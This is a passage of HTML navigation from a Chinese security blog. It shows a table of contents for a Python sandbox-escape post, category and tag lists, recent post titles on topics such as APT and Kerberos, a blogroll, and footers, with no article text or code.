href="#五、魔法方法"><span class="toc-number">5.</span> <span class="toc-text">五、魔法方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-魔法方法简介"><span class="toc-number">5.1.</span> <span class="toc-text">1.魔法方法简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-一切皆对象的py"><span class="toc-number">5.1.1.</span> <span class="toc-text">2.一切皆对象的py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、内存破坏突破python沙盒"><span class="toc-number">6.</span> <span class="toc-text">六、内存破坏突破python沙盒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#七、一些简单的python-沙盒"><span class="toc-number">7.</span> <span class="toc-text">七、一些简单的python 沙盒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目一、"><span class="toc-number">7.1.</span> <span class="toc-text">题目一、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目二"><span class="toc-number">7.2.</span> <span class="toc-text">题目二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目三"><span class="toc-number">7.3.</span> <span class="toc-text">题目三</span></a></li></ol></li></ol></div></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/byoungd/pure"> Pure Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/byoungd"> byoungd.</a></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=1.0.4" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.4" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.4"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.4"></script><script type="text/javascript" src="/js/prism.js?v=1.0.4"></script></div></body></html>
+</div><div class="tags"><a href="/tags/网络安全-沙盒逃逸-Python/">网络安全 沙盒逃逸 Python</a></div><div class="post-nav"><a class="pre" href="/2018/05/17/搭建docker的 CTF getshell环境/">搭建docker的 CTF getshell环境</a><a class="next" href="/2018/05/04/Python 的 type与class 之争/">Python 的 type与class 之争</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/浅析 Kerberos 认证过程以及黄金票据和白银票据/">浅析 Kerberos 认证过程以及黄金票据和白银票据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/13/C&C控制服务的设计和侦测方法综述(Drops from wooyun)/">C&C控制服务的设计和侦测方法综述(Drops from wooyun)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/09/如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)/">如何使用 DOM XSS 来绕过 CSP 的 nonces 机制(半机翻有删增)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
